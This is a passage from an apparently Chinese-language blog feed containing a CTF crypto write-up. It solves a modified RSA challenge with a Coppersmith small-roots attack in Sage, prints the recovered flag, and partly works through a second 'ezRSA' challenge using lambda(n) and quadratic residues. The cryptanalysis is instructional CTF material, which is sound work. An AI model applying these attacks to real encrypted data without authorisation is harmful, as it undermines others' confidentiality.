-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">'m.bit_length() &lt; 400'</span>,</span><br><span class="line"> <span class="string">'\x1a\x1d\xa6\xcc&#125;\xb9\x1f&#123;\xe36\xe5k\xb3\xe6\xf3\xecZs\xb0A\xa2\x01\x88\x8b\x8aU\xf1H\xaa\xa6\xda\x15'</span>,</span><br><span class="line"> <span class="string">'\xd3%\x9a\xad\x8c\x91\xfc\xc5\xf7\xa7)=\x0e\x89-\x15q\xf1\xe6\xff\xd4\xcc\xfbL\xa4P\\?\xce\x1a\\\x08'</span>,</span><br><span class="line"> <span class="string">'\xedCAz\nK\x1cA\xda\xde\x0e\xa8UA\xbe\x98X\x06*\xdc\x08g\x0fp\x06&#125;-LX\x8d\x05\xed'</span>]</span><br></pre></td></tr></table></figure>
-<p>所以，我们费了半天功夫得到的提示是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m.bit_length() &lt; 400</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>😅😅😅😅😅😅😅😅<br>
-这不是废话吗？？？<br>
-🤕🤕🤕 稍后打脸</p>
-</blockquote>
-<h2 id="task-py"><a href="http://task.py" target="_blank" rel="noopener">task.py</a></h2>
-<p>$$<br>
-n = q*p<br>
-\\<br>
-c_1 = m^p \pmod n<br>
-\\<br>
-c_2 = m^q \pmod n<br>
-$$<br>
-确实是共模攻击，和后来下架 <code>hint.py</code> 之后的新的问题提示一样，此“共模攻击”非彼“共模攻击”。<br>
-模数确实一样，但我们不知道密钥……<br>
-看了 WP，发现 Hint 是给 Coppersmith定理攻击 的可行性的提示……</p>
-<blockquote>
-<p>Coppersmith 定理指出在一个 e 阶的 $\pmod n$ 多项式 $f(x)$ 中，如果有一个根小于$n^{1/e}$，就可以运用一个 $O(log n)$ 的算法求出这些根。</p>
-</blockquote>
-<p>以下是分析：<br>
-hint 给出 m 比特长度上界，联想到 coppersmith，再可行性分析如下：<br>
-$$<br>
-c_1 = m^p = m \pmod p<br>
-\\<br>
-c_2 = m^q = m \pmod q<br>
-\\<br>
-\therefore n | (c_1-m)(c_2-m)<br>
-\\<br>
-\text{上界：} , \frac{1}{2}n^{1/2}  \approx 2^{511}<br>
-$$<br>
-因为 m.bit_length() &lt; 400，所以可行性分析通过。</p>
-<p><strong>Sage</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">128205304743751985889679351195836799434324346996129753896234917982647254577214018524580290192396070591032007818847697193260130051396080104704981594190602854241936777324431673564677900773992273463534717009587530152480725448774018550562603894883079711995434332008363470321069097619786793617099517770260029108149</span></span><br><span class="line">c1= <span class="number">96860654235275202217368130195089839608037558388884522737500611121271571335123981588807994043800468529002147570655597610639680977780779494880330669466389788497046710319213376228391138021976388925171307760030058456934898771589435836261317283743951614505136840364638706914424433566782044926111639955612412134198</span></span><br><span class="line">c2= <span class="number">9566853166416448316408476072940703716510748416699965603380497338943730666656667456274146023583837768495637484138572090891246105018219222267465595710692705776272469703739932909158740030049375350999465338363044226512016686534246611049299981674236577960786526527933966681954486377462298197949323271904405241585</span></span><br><span class="line">PR.&lt;y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g = (c1-y) * (c2-y)</span><br><span class="line">g.monic().small_roots(X=<span class="number">2</span>^<span class="number">400</span>, beta=<span class="number">1</span>)</span><br><span class="line">long_to_bytes(<span class="number">4242839043019782000788118887372132807371568279472499477998758466224002905442227156537788110520335652385855</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;verrrrrrry_345yyyyyyy_rsaaaaaaa_righttttttt?&#39;</span><br></pre></td></tr></table></figure>
-<h1>ezRSA</h1>
-<p>附件：<strong><a href="http://difficultrsa.py" target="_blank" rel="noopener">difficultrsa.py</a></strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, powmod, invert, gcd, mpz</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">gift = lcm(p - <span class="number">1</span> , q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line">flag = <span class="string">b'NPUCTF&#123;******************&#125;'</span></span><br><span class="line">m = int.from_bytes(flag , <span class="string">'big'</span>)</span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line">print(<span class="string">'n: '</span>, n)</span><br><span class="line">print(<span class="string">'gift: '</span>, gift)</span><br><span class="line">print(<span class="string">'c: '</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n: 17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line"><span class="comment">#gift:  2135492653776686212553329560560967285303308936825887355911916917454772197960682240149821138177216833586509090969892419775958406087994054585022894165950768427741545736247918410255804894522085720642952579638418483800243368312702566458196708508543635051350999572787188236243275631609875253617015664414032058822919469443284453403064076232765024248435543326597418851751586308514540124571309152787559712950209357825576896132278045112177910266019741013995106579484868768251084453338417115483515132869594712162052362083414163954681306259137057581036657441897428432575924018950961141822554251369262248368899977337886190114104</span></span><br><span class="line"><span class="comment">#c:  3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br></pre></td></tr></table></figure>
-<h2 id="分析-v3">分析</h2>
-<h3 id="λ-n-instead-of-φ-n">λ(n) instead of φ(n)</h3>
-<p>在 <a href="https://www.di-mgt.com.au/rsa_theory.html" target="_blank" rel="noopener">RSA Theory</a> 的 “Using λ(n) instead of φ(n)” 部分提到过：</p>
-<blockquote>
-<p>$d = e^{-1} \pmod {\phi(n)}$ 可以替换成  $d’ = e^{-1} \pmod {\lambda(n)}$，其中 $ \lambda(n) = lcm(p-1, q-1) = \frac{(p-1)(q-1)}{gcd(p-1, q-1)}$.</p>
-</blockquote>
-<p>这样一来，我们就可以用 λ(n)（题目中的 gift）来代替我们原本生成密钥的时候对 φ(n) 的需求。<br>
-需要注意的这道的中：$gcd(e, lcm) = 2$，不在 gift 的剩余系内（即没有逆元），所以需要进行适当地处理：<br>
-把 $c=m^e \pmod n$ 看成是 $c=(m^2 )^{(\frac{e}{2})} \pmod n$。</p>
-<p>$$<br>
-e’ = \frac{e}{2}<br>
-\\<br>
-d’ = (e^{ ’ })^{ -1 } \pmod { \lambda(n) }<br>
-\\<br>
-m^2 = c^{ d’ } \pmod {n}<br>
-$$</p>
-<p>之后就是一个二次剩余的问题了。</p>
-<h3 id="二次剩余">二次剩余</h3>
-<h4 id="Wolfram-爆破-v2">Wolfram 爆破</h4>
-<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Simplify</span>[</span><br><span class="line"> <span class="keyword">Reduce</span>[</span><br><span class="line">  c == <span class="keyword">Mod</span>[m^<span class="number">2</span>, p] /.</span><br><span class="line">   &#123;c -&gt; <span class="number">4457739276450750973807362088089319606097011997747961409022906575971021744219518190210017002304776543765491793897149413559709081776139101961</span>,</span><br><span class="line">    p -&gt; <span class="number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span>&#125;,</span><br><span class="line">  m, <span class="keyword">Integers</span></span><br><span class="line">  ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-<p>然而并没有跑出来。<br>
-其他的方法也卡住了 😭</p>
-<hr>
-<p>WP 告诉了我们新的思路：“非有限域下的二次根求解难度在m足够大的时候几乎不可行，于是思路转向分解n”。<br>
-⭐️ 这道题考察的点实际上是已知(e, n, d)来分解 n<br>
-TODO: <a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA" target="_blank" rel="noopener">https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA</a></p>
-<hr>
-<h1>总结</h1>
-<p>空闲时间比较有限，所以就碰了以上几道题目。<br>
-不得不说，主办方出的题有些魔性，参赛体验也比较糟糕，比赛开始没多久就被 DDoS 了，花了两天时间才恢复……<br>
-题目也很魔性，Misc 的抽象带师，flag 里面是中文+各种 emoji；一些题目信息放了又撤回等等……</p>
-<h1>参考资料</h1>
-<ol>
-<li><a href="https://liam.page/2018/01/12/Mersenne-twister/#mjx-eqn-eq%3Atwister" target="_blank" rel="noopener">谈谈梅森旋转：算法及其爆破</a></li>
-<li><a href="https://www.cnblogs.com/zhouzhendong/p/Number-theory-Residue-System.html" target="_blank" rel="noopener">数论算法 剩余系相关 学习笔记 (基础回顾,(ex)CRT,(ex)lucas,(ex)BSGS,原根与指标入门,高次剩余,Miller_Robin+Pollard_Rho)</a></li>
-<li><a href="https://blog.csdn.net/dreamzuora/article/details/52744666" target="_blank" rel="noopener">N次剩余(详解+例题+代码)</a></li>
-<li><a href="https://0xdktb.top/2020/04/19/WriteUp-NPUCTF-Crypto/#EzRSA" target="_blank" rel="noopener">WriteUp(NPUCTF) - Crypto</a></li>
-<li><a href="https://www.di-mgt.com.au/rsa_theory.html" target="_blank" rel="noopener">RSA Theory</a></li>
-<li><a href="https://masterpessimistaa.wordpress.com/2018/01/14/dlp-and-baby-step-giant-step-algorithm/" target="_blank" rel="noopener">DLP and Baby Step Giant Step Algorithm</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Crypto</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
